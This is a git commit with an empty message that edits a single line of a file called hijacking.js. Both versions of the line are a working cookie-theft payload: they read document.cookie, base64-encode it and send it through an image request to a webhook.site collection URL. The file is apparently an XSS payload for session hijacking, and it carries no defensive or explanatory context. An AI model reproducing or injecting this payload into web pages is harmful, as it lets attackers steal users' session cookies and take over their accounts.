89b2c9e84748967c04220f67a6e79e7ed74af878
THEREALSET <seltonluiz007@gmail.com>
2025-12-25 23:22:58 -0300

    empty

--- hijacking.js
+++ hijacking.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/b6c14e63-3047-45c9-b998-b9c3bfa485d3?data='+btoa(document.cookie);
+new Image().src = 'https://webhook.site/b6c14e63-3047-45c9-b998-b9c3bfa485d3?data='+btoa(document.cookie);
